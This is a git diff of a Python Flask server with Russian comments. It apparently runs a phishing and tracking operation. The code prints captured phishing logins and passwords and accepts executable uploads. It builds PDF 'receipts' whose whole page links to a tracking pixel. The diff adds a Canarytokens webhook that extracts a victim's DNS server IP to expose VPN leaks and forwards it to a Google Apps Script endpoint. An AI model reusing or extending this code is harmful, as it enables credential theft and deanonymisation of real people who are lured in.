@@ -17,6 +17,7 @@ if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
 
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}
+# Твой Google Script URL
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"
 
 # --- БАЗА ДАННЫХ ---
@@ -40,7 +41,7 @@ def allowed_file(filename):
 # --- ЛОГГЕР ---
 def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
     try:
-        # ПИШЕМ ПАРОЛЬ В КОНСОЛЬ
+        # ПИШЕМ ПАРОЛЬ В КОНСОЛЬ (для отладки на Render)
         if 'system' in data and 'phishing_password' in data['system']:
             print(f"\n[!!!] CREDENTIALS CAPTURED: {data['system']['phishing_login']} : {data['system']['phishing_password']}\n")
         
@@ -69,6 +70,7 @@ def generate_receipt(uid, filename):
     pdf.cell(200, 10, txt=f"ID: {uid}", ln=1)
     pdf.set_text_color(255, 0, 0)
     pdf.cell(200, 10, txt="STATUS: PENDING. CLICK TO OPEN.", ln=1)
+    # Ссылка внутри PDF (Web Bug)
     tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
     pdf.link(0, 0, 210, 297, tracking_url)
     receipt_name = f"receipt_{uid}.pdf"
@@ -79,6 +81,39 @@ def generate_receipt(uid, filename):
 # --- ROUTES ---
 @app.route('/health')
 def health_check(): return "OK", 200
+
+# === НОВЫЙ ROUTE: WEBHOOK ДЛЯ CANARYTOKENS ===
+@app.route('/webhook', methods=['POST'])
+def canary_webhook():
+    try:
+        # Canarytokens может слать данные как JSON или Form Data
+        data = request.json or request.form.to_dict()
+        
+        # Пытаемся извлечь IP DNS-сервера (это самое ценное при утечке)
+        canary_ip = "Unknown"
+        if 'source_ip' in data: canary_ip = data['source_ip']
+        elif 'ip' in data: canary_ip = data['ip']
+        
+        # Формируем отчет
+        report_data = {
+            "meta": {
+                "trigger": "DNS LEAK DETECTED (Canary)",
+                "url": "Webhook Hit",
+                "info": "This IP belongs to the DNS server used by the victim. If different from VPN IP -> LEAK CONFIRMED."
+            },
+            "network": {
+                "dns_leak_ip": canary_ip,
+                "full_canary_payload": data
+            }
+        }
+        
+        # Отправляем в Google Script
+        threading.Thread(target=send_email_background, args=(report_data, canary_ip, "Canarytokens Webhook", "DNS LEAK")).start()
+        
+        return jsonify({"status": "logged"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "details": str(e)}), 500
+# =============================================
 
 @app.route('/pixel.gif')
 def tracking_pixel():
@@ -149,15 +184,13 @@ def collect_data():
         else:
             data = json.loads(request.data.decode('utf-8'))
         
-        # --- ОБНОВЛЕННАЯ ЛОГИКА IP ---
-        # Берем первый IP из списка X-Forwarded-For, это реальный IP клиента
+        # Получаем реальный IP из заголовков Render/Cloudflare
         forwarded_for = request.headers.get('X-Forwarded-For', '')
         if forwarded_for:
             real_ip = forwarded_for.split(',')[0].strip()
         else:
             real_ip = request.remote_addr
 
-        # Добавляем отладочную инфу в данные
         if 'network' not in data: data['network'] = {}
         data['network']['server_detected_ip'] = real_ip
         data['network']['raw_headers_ip'] = forwarded_for
@@ -179,7 +212,6 @@ def add_comment():
         db[uid]['comments'].append({'username': data.get('username'), 'text': data.get('text'), 'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")})
         save_db(db)
         
-        # Логируем IP правильно
         forwarded_for = request.headers.get('X-Forwarded-For', '')
         real_ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr
         
